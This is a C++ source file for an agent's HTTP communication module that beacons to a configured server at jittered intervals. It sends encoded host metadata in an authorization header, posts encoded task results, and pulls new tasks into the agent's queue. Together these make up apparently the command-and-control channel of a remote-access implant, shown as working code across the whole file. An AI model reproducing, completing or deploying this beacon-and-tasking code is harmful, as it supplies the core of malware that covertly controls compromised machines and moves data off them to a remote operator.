#include <iostream>
#include <string>
#include <chrono>
#include "HTTPCommunicationModule.h"
#include "Helpers.h"


HTTPCommunicationModule::HTTPCommunicationModule(const std::string& address, int port, Agent& agent_ref)
	: Address(address), Port(port), httpClient(), running(false), agent(agent_ref),
	  hStopEvent(CreateEvent(NULL, TRUE, FALSE, NULL)),
	  rng(static_cast<unsigned>(
	        std::chrono::steady_clock::now().time_since_epoch().count()
	        ^ GetCurrentThreadId()))
{
}

HTTPCommunicationModule::~HTTPCommunicationModule() {
	if (hStopEvent) CloseHandle(hStopEvent);
}

DWORD HTTPCommunicationModule::nextSleepMs() {
	DWORD interval = agent.getBeaconIntervalMs();
	DWORD jitter   = agent.getBeaconJitterMs();
	std::uniform_int_distribution<DWORD> dist(
		interval > jitter ? interval - jitter : 0,
		interval + jitter
	);
	return dist(rng);
}

void HTTPCommunicationModule::Config(){
	AgentMetadata metadata = agent.getMetadata();
	std::string metadata_str = metadata.to_json();
	std::string metadata_encoded = base64_encode(metadata_str);
	std::cout << "Metadata JSON: " << metadata_encoded << std::endl;
	headers = {
				L"Content-Type: application/json",
				L"User-Agent: MyHttpClient/1.0",
				L"Authorization: Bearer " + s2ws(metadata_encoded)
			};
	running = true;
}

void HTTPCommunicationModule::Start() {
	while (running) {
		Checkin();
		// Sleep with jitter; wakes immediately if Stop() signals hStopEvent.
		DWORD result = WaitForSingleObject(hStopEvent, nextSleepMs());
		if (result == WAIT_OBJECT_0) break;
	}
}

void HTTPCommunicationModule::Stop() {
	running = false;
	if (hStopEvent) SetEvent(hStopEvent);
}

void HTTPCommunicationModule::Checkin(){

	//Get TaskResults
	std::vector<TaskResult> results = agent.getTaskResults();
	std::string data = "{\"results\":\"" + base64_encode(arrayTaskResult2json(results)) + "\"}";

	std::cout << "Request Body: " << data << std::endl;

	HttpResponse response = httpClient.Post(s2ws(Address), Port, L"/", data, headers);
	std::cout << "Response Body: " << response.body << std::endl;

	// Minimum valid response: {"tasks":[]} = 12 chars.
	// Skip silently on connection failure or unexpected response.
	if (response.body.size() <= 10) return;

	std::string tasks_string = response.body.substr(10);
	if (tasks_string.empty()) return;
	tasks_string.pop_back();

	std::cout << "Tasks String: " << tasks_string << std::endl;
	std::vector<Task> tasks = json2arrayTasks(tasks_string);

	for (int i = 0; i < tasks.size(); i++) {
		agent.addTask(tasks[i]);
	}
}

